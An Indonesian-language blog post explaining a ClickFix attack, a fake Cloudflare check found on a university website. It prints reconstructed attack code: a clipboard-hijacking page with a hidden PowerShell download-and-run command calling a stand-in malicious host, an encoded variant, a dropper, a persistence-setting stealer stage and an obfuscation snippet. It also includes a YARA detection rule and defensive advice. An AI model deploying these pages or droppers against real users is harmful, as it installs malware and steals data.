---
title = "Cloudflare ClixFix: Serangan Social Engineering yang Menyerang Website Kampus"
date = 2026-07-04
penulis = "Rysnanto"
description = "Kronologi pengalaman saya menemukan serangan Cloudflare ClixFix di website universitas unirow.ac.id, lengkap dengan analisis kode dan cara pencegahannya"
ilustration = "/ilustration/clickfix.webp"
draft = false
+++

Saat saya sedang browsing website kampus **unirow.ac.id** untuk keperluan kuliah, tiba-tiba saya disuguhkan halaman verifikasi Cloudflare yang familiar. Tapi ada yang aneh — halaman ini meminta saya menekan **Windows + R**, lalu **Ctrl + V** dan **Enter**.

Bukan captcha biasa. Ini serangan **ClickFix**.

## Apa itu ClickFix?

ClickFix adalah teknik **social engineering** yang menipu pengguna agar menjalankan perintah berbahaya dengan cara menyalin (copy) perintah PowerShell/Shell ke clipboard, lalu meminta korban untuk menjalankannya melalui **Windows Run** (Win+R) atau **Terminal**.

Teknik ini pertama kali didokumentasikan oleh **Proofpoint** pada April 2024 dan menjadi salah satu serangan paling marak di tahun 2025-2026.

### Modus Operandi

1. Pengguna mengunjungi website yang sudah dikompromikan (atau redirect ke halaman palsu)
2. Halaman palsu menampilkan **fake Cloudflare Turnstile** atau **reCAPTCHA**
3. Saat pengguna klik "Verify", JavaScript diam-diam menyalin perintah berbahaya ke **clipboard**
4. Halaman menampilkan instruksi: *"Tekan Win+R, Ctrl+V, Enter untuk verifikasi"*
5. Pengguna menjalankan perintah tanpa sadar → **malware terinstall**

## Kronologi di unirow.ac.id

Kronologi yang saya alami:

1. Saya buka `https://unirow.ac.id` seperti biasa
2. Halaman tidak langsung muncul, melainkan muncul **pop-up Cloudflare verifikasi**
3. Saya perhatikan ada tombol **"Verify"** dengan tulisan kecil instruksi
4. Instruksi meminta saya menekan **Win+R → Ctrl+V → Enter**
5. Saya curiga karena **Cloudflare asli tidak pernah meminta hal ini**
6. Saya cek source code halaman → ternyata ada script berbahaya yang menyalin payload ke clipboard
7. Saya **tidak menjalankan** perintah tersebut

Website universitas kemungkinan besar menjadi korban dari kampanye massal yang menyerang **700+ website pendidikan dan teknologi** (dilaporkan oleh Malwarebytes, Mei 2026) melalui celah keamanan **Ghost CMS** (CVE-2026-26980).

## Contoh Kode Serangan

### 1. Halaman Palsu Cloudflare (HTML + JavaScript)

```html
<!DOCTYPE html>
<html>
<head>
  <title>Just a moment...</title>
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, sans-serif;
      display: flex; justify-content: center; align-items: center;
      min-height: 100vh; background: #f5f5f5;
    }
    .cf-box {
      background: #fff; padding: 40px; border-radius: 8px;
      box-shadow: 0 2px 20px rgba(0,0,0,0.1); text-align: center;
      max-width: 400px;
    }
    .cf-box h2 { font-size: 20px; margin-bottom: 16px; }
    .cf-box p { color: #666; font-size: 14px; margin-bottom: 24px; }
    .verify-btn {
      background: #f6821f; color: #fff; border: none;
      padding: 12px 32px; border-radius: 4px; font-size: 16px;
      cursor: pointer;
    }
    .steps {
      background: #f8f8f8; padding: 16px; border-radius: 8px;
      margin-top: 20px; text-align: left; font-size: 13px;
    }
    .steps li { margin-bottom: 8px; }
  </style>
</head>
<body>
  <div class="cf-box">
    <h2>☁️ Cloudflare Security Check</h2>
    <p>Silakan verifikasi bahwa Anda manusia untuk melanjutkan</p>
    <button class="verify-btn" onclick="copyPayload()">Verify you are human</button>
    <div class="steps">
      <strong>Langkah verifikasi:</strong>
      <ol>
        <li>Tekan <b>Windows + R</b></li>
        <li>Tekan <b>Ctrl + V</b> di kolom</li>
        <li>Tekan <b>Enter</b></li>
      </ol>
    </div>
  </div>

  <script>
    // === PAYLOAD BERBAHAYA ===
    var maliciousCmd =
      'powershell -w h -nop -c "' +
      "$u='http://malicious-site.com/payload.lim';" +
      "$p=\"$env:TEMP\\data.ps1\";" +
      "(New-Object System.Net.WebClient).DownloadFile($u,$p);" +
      'powershell -w h -ep bypass -f $p"';

    function copyPayload() {
      // Salin perintah berbahaya ke clipboard
      navigator.clipboard.writeText(maliciousCmd).then(function() {
        alert('Berhasil! Sekarang Win+R → Ctrl+V → Enter');
      });
    }
  </script>
</body>
</html>
```

### 2. Variasi: Clipboard Injection via `document.execCommand`

```javascript
// Metode lama (fallback untuk browser lama)
function silentCopy(text) {
  var ta = document.createElement('textarea');
  ta.value = text;
  ta.style.position = 'fixed';
  ta.style.left = '-9999px';
  document.body.appendChild(ta);
  ta.select();
  document.execCommand('copy');
  document.body.removeChild(ta);
}

// Perintah berbahaya yang disalin
var cmd = 'powershell -w h -nop -enc ' +
  'SQBFAFgAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYQB0AHQAYQBjAGsAZQByAC4AYwBvAG0ALwBwAGEAeQBsAG8AYQBkACcAKQA=';
silentCopy(cmd);
```

### 3. Payload PowerShell yang Diunduh

```powershell
# === DROPPER STAGE 1 ===
# Download dan eksekusi payload
$u = 'http://malicious-site.com/stage2.ps1'
$p = "$env:TEMP\cache.ps1"
(New-Object System.Net.WebClient).DownloadFile($u, $p)
powershell -w h -ep bypass -f $p
```

```powershell
# === STAGE 2: INFO-STEALER ===
# Decode base64 → drop binary → persistence

# Buat folder tersembunyi
$dir = "$env:APPDATA\Microsoft\Windows\Templates"
New-Item -Path $dir -ItemType Directory -Force
Set-ItemProperty $dir -Name Attributes -Value "Hidden, System"

# Decode & write binary
$encoded = "TVqQAAMAAAAEAAAA..." # Base64-encoded PE file
$bytes = [Convert]::FromBase64String($encoded)
[System.IO.File]::WriteAllBytes("$dir\svchost.exe", $bytes)

# Persistence via Startup shortcut
$sh = New-Object -ComObject WScript.Shell
$lnk = $sh.CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\update.lnk")
$lnk.TargetPath = "$dir\svchost.exe"
$lnk.Save()

# Jalankan
Start-Process "$dir\svchost.exe" -WindowStyle Hidden
```

### 4. Obfuscation: Base64 + XOR Encoding

```javascript
// Teknik obfuscasi yang digunakan attacker
var payload = "cG93ZXJzaGVsbCAtdyBoIC1ub3AgLWMg...";

// XOR decode dengan key 0x83
function xorDecode(encoded, key) {
  var decoded = '';
  for (var i = 0; i < encoded.length; i++) {
    decoded += String.fromCharCode(encoded.charCodeAt(i) ^ key);
  }
  return decoded;
}

// Decode dan jalankan
var cmd = xorDecode(atob(payload), 0x83);
eval(new Function('return ' + cmd)());
```

### 5. Deteksi & YARA Rule

```yara
rule ClickFix_Cloudflare_Fake {
  meta:
    description = "Detects ClickFix fake Cloudflare verification pages"
    author = "Security Researcher"
    date = "2026-07-04"

  strings:
    $cf1 = "Cloudflare Security Check"
    $cf2 = "Verify you are human"
    $cf3 = "Windows + R"
    $cf4 = "Ctrl + V"
    $cf5 = "Win+R"

    $ps1 = "powershell -w h"
    $ps2 = "powershell -enc"
    $ps3 = "IEX(New-Object"
    $ps4 = "DownloadString"
    $ps5 = "DownloadFile"
    $ps6 = "-ep bypass"

    $clip1 = "navigator.clipboard.writeText"
    $clip2 = "execCommand('copy')"

  condition:
    2 of ($cf*) and (2 of ($ps*) or 1 of ($clip*))
}
```

## CVE Terkait ClickFix

| CVE | Target | Dampak |
|-----|--------|--------|
| CVE-2026-26980 | Ghost CMS | 700+ website dikompromikan untuk distribusi ClickFix |
| CVE-2024-28000 | LiteSpeed Cache (WordPress) | Privilege escalation → admin → inject ClickFix |
| CVE-2024-2879 | LayerSlider (WordPress) | SQL injection → admin creation → inject ClickFix |
| CVE-2023-40000 | LiteSpeed Cache (WordPress) | Stored XSS → inject ClickFix |

## Cara Mendeteksi

1. **Jangan pernah** jalankan perintah yang disalin dari website yang tidak kamu ketahui asalnya
2. **Cek clipboard** — kalau kamu tekan Ctrl+V dan muncul perintah PowerShell, **stop**
3. **Perhatikan URL** — domain harus benar, bukan redirect atau subdomain aneh
4. **Cloudflare asli tidak pernah** meminta kamu menjalankan perintah apapun
5. Gunakan **EDR/antivirus** yang mendeteksi anomali PowerShell

## Pencegahan

### Untuk Webmaster
- Selalu update CMS dan plugin ke versi terbaru
- Gunakan **Cloudflare WAF** dengan rules yang aktif
- Implementasi **Content Security Policy (CSP)** yang ketat
- Monitor file integrity di server
- Audit kode secara berkala untuk deteksi inject

### Untuk Pengguna
- **Jangan jalankan** perintah apapun dari pop-up verifikasi
- Jika terlanjur, **matikan internet segera** dan scan antivirus
- Laporkan website mencurigakan ke [Safe Browsing Google](https://transparencyreport.google.com/safe-browsing/report)
- Gunakan browser terbaru dengan fitur keamanan lengkap

---

> **Kesimpulan**: ClickFix menyerang karena manusia adalah link terlemah dalam keamanan siber. Website kampus seperti unirow.ac.id rentan karena sering menggunakan CMS dengan plugin yang belum diupdate. Selalu waspada — **Cloudflare tidak pernah meminta kamu menjalankan perintah apapun**.
